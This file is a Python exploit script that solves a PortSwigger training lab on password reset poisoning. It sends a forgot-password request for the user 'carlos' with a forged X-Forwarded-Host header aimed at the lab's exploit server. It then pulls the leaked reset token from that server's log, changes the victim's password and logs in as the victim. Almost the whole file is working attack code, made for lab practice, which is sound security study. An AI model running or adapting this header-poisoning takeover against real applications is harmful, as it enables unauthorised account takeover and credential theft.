#!/usr/bin/env python3
# Lab: Password reset poisoning via middleware
# Lab-Link: <https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-poisoning-via-middleware>  
# Difficulty: PRACTITIONER
from bs4 import BeautifulSoup
import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def find_exploitserver(text):
    soup = BeautifulSoup(text, 'html.parser')
    try:
        result = soup.find('a', attrs={'id': 'exploit-link'})['href']
    except TypeError:
        return None
    return result


def forgot_password(host, client, exploit_server):
    url = f'{host}/forgot-password'
    client.get(url)
    headers = {
        'X-Forwarded-Host': exploit_server[8:],
        'Referer': f'{host}/forgot-password',
        'Origin': host,
    }
    data = {'username': 'carlos'}
    return client.post(url, headers=headers, data=data).status_code == 200


def get_password_change_token(exploit_server, client):
    r = client.get(f'{exploit_server}/log')
    if r.status_code != 200:
        return None

    try:
        soup = BeautifulSoup(r.text, 'html.parser')
        result = soup.find('pre', attrs={'class': 'container'}).text
        exfiltrate_line = result.splitlines()[-1]
        # line is of this format:
        # 10.0.4.222      2022-06-05 18:16:28 +0000 "GET /forgot-password?temp-forgot-password-token=6asQcwAbxwlqY7UjEu5lQz08kc4NgZt9 HTTP/1.1" 404 "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.61 Safari/537.36"
        token = exfiltrate_line.split()[5].split('?')[1]
        # token should be of format 
        # temp-forgot-password-token=VIuvpiHFH0HrDNPYOWjLCAxbbLBBFxLZ
        return token
    except:
        return None
    return None


def change_password(host, client, token, username, new_password):
    data = {
        token.split('=')[0]: token.split('=')[1],
        'username': username,
        'new-password-1': new_password,
        'new-password-2': new_password
    }
    url = f'{host}/forgot-password'
    return client.post(url, data=data, allow_redirects=False).status_code == 302


def login(client, host, username, password):
    url = f'{host}/login'
    data = {'username': username,
            'password': password}
    res = client.post(url, data=data)
    return f'Your username is: {username}' in res.text


def main():
    print('[+] Password reset poisoning via middleware')
    try:
        host = sys.argv[1].strip().rstrip('/')
    except IndexError:
        print(f'Usage: {sys.argv[0]} <HOST>')
        print(f'Exampe: {sys.argv[0]} http://www.example.com')
        sys.exit(-1)

    with requests.Session() as client:
        client.verify = False
        client.proxies = proxies

        exploit_server = find_exploitserver(client.get(host).text)
        if exploit_server is None:
            print(f'[-] Failed to find email server')
            sys.exit(-2)
        print(f'[+] Email server: {exploit_server}')

        if not forgot_password(host, client, exploit_server):
            print(f'[-] Something went wrong requesting the password reset')
            sys.exit(-3)
        print(f'[+] Password reset requested')

        password_change_token = get_password_change_token(exploit_server, client)
        if password_change_token is None:
            print(f'[-] Failed to obtain password change token')
            sys.exit(-4)
        print(f'[+] Password change token obtained: {password_change_token}')

        username = 'carlos'
        new_password = '123'
        if not change_password(host, client, password_change_token, username, new_password):
            print(f'[-] Failed to change password for {username}')
            sys.exit(-4)
        print(f'[+] Password changed for {username}')

        if not login(client, host, username, new_password):
            print(f'[-] Failed to login as {username}')
            sys.exit(-5)
        print(f'[+] Logged in as {username}')
        print(f'[+] Lab solved')


if __name__ == "__main__":
    main()
